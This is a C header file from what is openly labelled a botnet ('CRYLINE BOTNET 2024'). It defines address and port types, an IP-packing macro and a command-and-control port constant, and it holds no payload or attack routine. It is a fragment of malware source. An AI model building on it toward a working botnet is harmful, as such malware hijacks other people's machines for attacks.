/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

typedef char __GET_BOOL;

typedef uint32_t __IPV4;
typedef uint16_t __PORT_OPTION;

#define __INET_ADDR(_FIRST, _SECOND, _THIRD, _FOURTH) (htonl((_FIRST << 24) | (_SECOND << 16) | (_THIRD << 8) | (_FOURTH << 0)))
#define __CNC_RPORT 18916

extern __IPV4 LOCAL_ADDRESS_SETTER;
